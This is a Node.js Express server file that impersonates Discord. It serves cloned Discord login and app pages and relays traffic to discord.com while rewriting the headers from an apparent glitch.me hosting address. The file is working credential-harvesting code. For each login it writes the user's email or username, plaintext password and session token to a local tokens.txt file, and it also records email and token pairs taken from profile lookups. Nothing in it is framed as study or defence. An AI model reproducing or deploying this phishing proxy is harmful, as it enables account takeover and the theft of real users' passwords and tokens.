const express = require("express");
const app = express();
const fs = require("fs");
let fetch = require('node-fetch')
var discordIndexHTML = fs.readFileSync(__dirname + "/index.html", { encoding: "utf8" });
const http = require('http');
let ws = require('ws')

const server = new http.createServer(app);
server.listen(3000)

let wss = new ws.Server({ server });
app.use("/src", express.static(__dirname + "/src"));
const bodyParser = require('body-parser');
console.log('Started')
 app.use(bodyParser.json({limit: "50mb"}));

app.use("/:data*", async (req, res) => {
  if(req.originalUrl === '/assets/0.2d737cc92c807c265e1f.css') return res.sendFile(__dirname + "/style1.css")
  if(req.originalUrl === '/assets/532.d49196785d17cb9b60a9.css') return res.sendFile(__dirname + "/style2.css")
  if(req.originalUrl === '/app') return res.sendFile(__dirname + "/app.html")
  if(req.originalUrl === '/login') return res.sendFile(__dirname + "/login.html")
  if(req.originalUrl === '/') return res.sendFile(__dirname + "/index.html")

  let headers = req.headers
  var headersNew = {}
if(headers['x-super-properties']) headersNew['x-super-properties'] = headers['x-super-properties']
  if(headers['user-agent']) headersNew['user-agent'] = headers['user-agent']
if(headers['x-discord-locale']) headersNew['x-discord-locale'] = headers['x-discord-locale']
if(headers['authorization']) headersNew['authorization'] = headers['authorization']
if(headers['cookie']) headersNew['cookie'] = headers['cookie']
if(headers['x-fingerprint']) headersNew['x-fingerprint'] = headers['x-fingerprint']
if(headers['content-type']) headersNew['content-type'] = headers['content-type']
//          console.log('https://discord.com' + req.originalUrl)

// if(headersNew.authorization) headersNew.authorization = "Bot " + headersNew.authorization
 if(headersNew.referer) headersNew.referer = `${headersNew.referer}`.replace('https://scalloped-mahogany-chronometer.glitch.me/', 'https://discord.com/')
 if(headersNew.origin) headersNew.origin = `https://discord.com/`
  console.log('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7'))
  if(JSON.stringify(req.body) !== `{}`){
  let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew, body: JSON.stringify(req.body)}).catch(err =>{})
  if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, body: JSON.stringify(req.body)}).catch(err =>{})
  if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method}).catch(err =>{})

  let dataText = await dataFetch.text()
  try {
  
    let s = JSON.parse(dataText)
    console.log(s)
    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
	
if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}
if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
	
if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}

    
    return res.status(dataFetch.status).json(s)
    
  } catch {
return res.status(dataFetch.status).send(dataText)
}
        }else{
          if('https://discord.com' + req.originalUrl === "https://discord.com/api/v6/experiments") headersNew = {}
          headersNew.host = "discord.com"
  let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew}).catch(err =>{})
  if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method}).catch(err =>{})

  let dataText = await dataFetch.text()
  try {
  
    let s = JSON.parse(dataText)
    console.log(s)
if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
	
if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}
if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
	
if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}

    
    return res.status(dataFetch.status).json(s)
    
  } catch {
return res.status(dataFetch.status).send(dataText)
}
}

});


app.use("/", async (req, res) => {
	res.send(discordIndexHTML);
});

let clientWs = require('./ws/index.js')

wss.on('connection', async function connection(client, req) {


new clientWs(client, req, wss)
})
